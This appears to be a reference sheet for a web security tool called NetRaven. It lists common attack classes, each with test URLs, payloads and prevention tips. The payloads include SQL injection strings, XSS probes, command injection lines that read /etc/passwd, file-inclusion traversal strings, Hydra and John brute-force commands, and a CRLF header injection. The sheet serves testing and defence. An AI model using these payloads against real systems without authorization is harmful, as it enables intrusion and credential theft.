# NetRaven Attack Reference

## SQL Injection (SQLi)

Injects SQL code into input fields to manipulate the database.

**Test URLs:**
- `http://target/page.php?id=1`
- `http://target/search.php?q=test`

**Common Payloads:**
- `' OR '1'='1`
- `' UNION SELECT NULL,NULL,NULL-- `
- `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)y)-- `

**Prevention:**
- Use prepared statements (PDO/MySQLi)
- Never concatenate user input into SQL queries
- Validate and sanitize all inputs

## Cross-Site Scripting (XSS)

Injects malicious scripts into web pages viewed by other users.

**Test URLs:**
- `http://target/search.php?q=test`

**Common Payloads:**
- `<script>alert(1)</script>`
- `"><svg onload=alert(1)>`
- `<img src=x onerror=alert(1)>`

**Prevention:**
- Output encoding with `htmlspecialchars()`
- Content-Security-Policy (CSP) headers
- Validate and sanitize user input

## Command Injection (CMDi)

Executes arbitrary OS commands via vulnerable input fields.

**Test URLs:**
- `http://target/exec.php?cmd=whoami`

**Common Payloads:**
- `;id`
- `|cat /etc/passwd`
- `$(whoami)`

**Prevention:**
- Never pass user input to shell commands
- Use parameterized APIs instead of system calls
- Validate and whitelist allowed commands

## Local File Inclusion (LFI)

Includes local files via directory traversal.

**Test URLs:**
- `http://target/view.php?file=index`
- `http://target/view.php?file=../../../../etc/passwd`

**Common Payloads:**
- `../../../../etc/passwd`
- `php://filter/convert.base64-encode/resource=index`
- `....//....//....//....//etc/passwd`

**Prevention:**
- Validate file paths against allowlists
- Disable `allow_url_include` in PHP
- Use absolute paths and basename validation

## Brute Force

Tries many passwords/logins against authentication endpoints.

**Tools:**
- Hydra: `hydra -L users.txt -P passwords.txt target http-post-form "/login:user=^USER^&pass=^PASS^:F=error"`
- John: `john --wordlist=rockyou.txt hash.txt`

**Prevention:**
- Rate limiting and account lockout
- Multi-factor authentication (MFA)
- Strong password policies
- CAPTCHA

## Open Redirect

Redirects users to untrusted external domains.

**Test URLs:**
- `http://target/redirect.php?url=home`
- `http://target/redirect.php?url=https://evil.com`

**Prevention:**
- Validate redirect URLs against a whitelist
- Use relative paths instead of full URLs

## CSRF

Tricks authenticated users into submitting unwanted actions.

**Detection:**
- Check for missing anti-CSRF tokens in forms
- Verify SameSite cookie attributes

**Prevention:**
- Implement anti-CSRF tokens
- Use SameSite cookies
- Verify origin/referer headers

## Clickjacking

Tricks users into clicking hidden UI elements via iframe overlays.

**Detection:**
- Check for missing `X-Frame-Options` header
- Check for missing `frame-ancestors` in CSP

**Prevention:**
- Set `X-Frame-Options: DENY` or `SAMEORIGIN`
- Use `Content-Security-Policy: frame-ancestors 'none'`

## CRLF Injection

Inserts CRLF characters to split HTTP headers or inject content.

**Test URLs:**
- `http://target/redirect.php?input=test`
- `http://target/redirect.php?input=%0d%0aSet-Cookie:injected=true`

**Prevention:**
- Strip CRLF characters from user input
- Validate and sanitize header values
- Use proper URL encoding
